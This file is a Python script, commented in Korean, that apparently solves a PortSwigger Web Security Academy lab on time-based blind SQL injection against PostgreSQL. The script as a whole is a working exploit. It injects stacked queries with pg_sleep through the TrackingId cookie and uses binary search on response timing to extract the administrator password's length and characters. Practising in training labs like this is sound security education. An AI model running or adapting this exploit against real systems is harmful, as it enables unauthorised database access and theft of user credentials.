import requests
import re

#PortSwigger Blind SQL injection with time delays and information retrieval문제 풀이 코드
#PostgreSQL

s = requests.Session()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

#trackingId_cookie와 session_id값 적기
url = "https://0a2500c303af190280ea266d009500f4.web-security-academy.net/"
session_id_data = "" # 이 부분을 채워주세요
trackingId_cookie = "" # 이 부분을 채워주세요


pass_len = 0
low_len = 1
high_len = 40

print("비밀번호 길이 측정 시작...")
i = 1
# 비밀번호 길이 추출
while low_len<=high_len:
    mid_len = (low_len+high_len)//2
    
    payload = f"{trackingId_cookie}'%3B SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='administrator'))>{mid_len} THEN pg_sleep(3) ELSE pg_sleep(0) END--"
    cookies = {
        "session" : session_id_data,
        "TrackingId" : payload
    } 
    try:
        response = s.get(url, headers=headers, cookies = cookies)
        print(f"범위 좁히는 중...")
        if response.elapsed.total_seconds()>=3:
            low_len = mid_len + 1
        else:
            pass_len = mid_len
            high_len = mid_len -1

    except Exception as e:
        print(f"[X_len] Error Occured: {e}")
        break
print(f"[!] 최종 확인된 비밀번호 길이: {pass_len}")


one_letter_list = sorted('0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')#'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
password=""
#비밀번호 찾기
if pass_len > 0:
    print('비밀번호 한 자리씩 추출 시작...')

    for i in range(1, pass_len+1):
        low = 0
        high = len(one_letter_list) - 1
        current_char = "?"
        while low <= high:
            mid = (low+high)//2
            target_char = one_letter_list[mid]
            payload = f"{trackingId_cookie}'%3B SELECT CASE WHEN ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1))>{ord(target_char)} THEN pg_sleep(3) ELSE pg_sleep(0) END--"
            cookies = {
                "session" : session_id_data,
                "TrackingId" : payload
            } 
            try:
                response = s.get(url, headers=headers, cookies = cookies)

                if response.elapsed.total_seconds()>=3:
                    low = mid+1
                else:
                    high = mid - 1
            except Exception as e:
                print(f"[X_pass] Error Occured: {e}")
        if low < len(one_letter_list):
            current_char = one_letter_list[low]
            password += current_char
            print(f"[!] {i}번째 문자 발견; {current_char}")

print(f"최종 비밀번호: {password}")